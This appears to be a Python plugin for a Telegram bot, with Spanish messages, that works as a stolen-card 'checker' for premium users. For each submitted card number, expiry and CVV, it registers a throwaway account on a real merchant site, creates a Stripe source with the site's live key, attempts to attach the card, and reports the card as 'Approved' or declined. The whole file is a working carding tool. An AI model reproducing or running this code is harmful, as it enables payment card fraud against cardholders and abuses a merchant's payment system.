import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

import string
from datos import idchat
import random
from gateways import Gateways


@Client.on_message(filters.command(["yu"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/yu card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/yu card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()

            random_s = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
            domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
            rnd_mail = random_s + '@' + random.choice(domains)

            gate = Gateways('Yupi', ccs)
            text = gate.initial_progress()
            mess = await message.reply_text(text)
            
            headers = {
                'authority': 'www.dealify.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6',
                'origin': 'https://www.dealify.com',
                'referer': 'https://www.dealify.com/my/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }
            data = {
                'awcfe_disabled_fields': '',
                'awcfe_cart_items': '',
                'awcfe_cart_variatns': '',
                'awcfe_cart_categories': '',
                'awcfe_cart_shipping_class': '',
                'awcfe_amount_subtotal': '0',
                'awcfe_amount_total': '0',
                'awcfe_role_user': '',
                'awcfe_cart_weight': '0',
                'email': f'{rnd_mail}',
                'metorik_source_type': 'typein',
                'metorik_source_url': '(none)',
                'metorik_source_mtke': '(none)',
                'metorik_source_utm_campaign': '(none)',
                'metorik_source_utm_source': '(direct)',
                'metorik_source_utm_medium': '(none)',
                'metorik_source_utm_content': '(none)',
                'metorik_source_utm_id': '(none)',
                'metorik_source_utm_term': '(none)',
                'metorik_source_session_entry': 'https://www.dealify.com/my/add-payment-method/',
                'metorik_source_session_start_time': '2023-03-07 19:16:24',
                'metorik_source_session_pages': '14',
                'metorik_source_session_count': '1',
                'woocommerce-register-nonce': 'a9fde5e89e',
                '_wp_http_referer': '/my/add-payment-method/',
                'register': 'Register',
            }
            data1 = f'type=card&owner[name]=+&owner[email]={rnd_mail}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb998f5daf%3B+stripe-js-v3%2Fb998f5daf&time_on_page=22569&key=pk_live_51JtdLAJyjOP0PukBZntEnFxcX3xltFne7PaqL2j6Em1uzyCiJuEl9zUFfstUugwP2UBGoGmYmw7qY4IuPwep2Lxs00M4dxrmmW'
            
            re1 = session.post('https://www.dealify.com/my/add-payment-method/', headers=headers, data=data)
            t = re1.text.split('add_card_nonce":"')[1].split('"')[0]

            re2 = session.post('https://api.stripe.com/v1/sources', data=data1)
            i = re2.json()['id']
              
            headers1 = {
                'authority': 'www.dealify.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.dealify.com',
                'referer': 'https://www.dealify.com/my/add-payment-method/?_wc_user_reg=true',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'wc-ajax': 'wc_stripe_create_setup_intent',
            }
            data2 = {
                'stripe_source_id': f'{i}',
                'nonce': f'{t}',
            }
            response = session.post('https://www.dealify.com/', params=params, headers=headers1, data=data2)
            text = gate.initial_progress(100)
            mess = await mess.edit_text(text)
            #error = response.json()["error"]["message"]
            if 'Your card was declined.' in response.text:
                error = response.json()["error"]
                code= 'card_declined'
                text = gate.finish_progress(error["message"] + "❌", code)
                await mess.edit_text(text)
            elif 'Your card number is incorrect.' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Decline ❌', error['message'])
                await mess.edit_text(text)
            elif 'three_d_secure_2_source' in response.text:
                text = gate.finish_progress('Approved 3D ✅')
                await mess.edit_text(text)
            elif 'Your card has insufficient funds. ' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Approved ✅', error['message'])
                await mess.edit_text(text)
            elif "Your card's security code is incorrect." in response.text:
                error = response.json()["error"]
                code = 'incorrect_cvc'
                text = gate.finish_progress(error["message"] + "✅", error)
                await mess.edit_text(text)
            elif 'success' in response.text:
                error = 'Succeeded ✅'
                text = gate.finish_progress('Approved ✅', error)
                await mess.edit_text(text)
            else:
                error = response.text
                text = gate.finish_progress('Unknown ❌ ', error)
                await mess.edit_text(text)

           



        else:
            return await message.reply(f'<b>⎚ Chat no autorizado | O no eres Premium.</b>')
   